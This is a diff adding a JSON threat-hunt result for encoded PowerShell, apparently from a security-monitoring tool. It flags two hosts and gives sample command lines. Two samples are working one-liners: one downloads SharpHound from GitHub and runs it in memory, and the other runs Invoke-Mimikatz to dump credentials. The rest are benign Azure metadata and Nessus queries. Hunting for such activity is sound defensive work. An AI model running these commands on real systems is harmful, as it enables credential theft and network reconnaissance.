@@ -1,0 +1,69 @@
+{
+  "hunt": "encoded_powershell",
+  "category": "construction_threats",
+  "status": "suspicious",
+  "findings": 11,
+  "severity": "high",
+  "columns": [
+    "executions",
+    "first_seen",
+    "last_seen",
+    "host.name",
+    "process.name",
+    "process.command_line",
+    "duration_minutes"
+  ],
+  "entities": {
+    "hosts": [
+      "LB-CCDEMO-01-RD",
+      "SSI-F9"
+    ]
+  },
+  "sample_values": [
+    [
+      2,
+      "2026-03-14T19:26:45.000Z",
+      "2026-03-14T19:26:45.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"powershell.exe\" & {write-host \\\"\"Remote download of SharpHound.ps1 into memory, followed by execution of the script\\\"\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5}",
+      0
+    ],
+    [
+      2,
+      "2026-03-14T19:26:45.000Z",
+      "2026-03-14T19:26:45.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:49.485Z",
+      "2026-03-12T11:47:49.485Z",
+      "SSI-F9",
+      "powershell.exe",
+      "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe  \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"x-ms-version\\\", \\\"2015-04-05\\\"); $webClient.Headers.add(\\\"x-ms-guest-agent-name\\\", \\\"WaAgent-2.5.0.0 (2.7.0.0)\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/machine?comp=goalstate\\\")};\" ",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.746Z",
+      "2026-03-12T11:47:51.746Z",
+      "SSI-F9",
+      "powershell.exe",
+      "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe  \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"Metadata\\\", \\\"true\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\\\")};\" ",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.746Z",
+      "2026-03-12T11:47:51.746Z",
+      "SSI-F9",
+      "cmd.exe",
+      "C:\\Windows\\System32\\cmd.exe /c \"echo nessus_cmd_L21ldGFkYXRhL2luc3RhbmNlL2NvbXB1dGU/YXBpLXZlcnNpb249MjAxNy0xMi0wMQ==_start & C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"Metadata\\\", \\\"true\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\\\")};\" & echo nessus_cmd_L21ldGFkYXRhL2luc3RhbmNlL2NvbXB1dGU/YXBpLXZlcnNpb249MjAxNy0xMi0wMQ==_stop\"",
+      0
+    ]
+  ]
+}
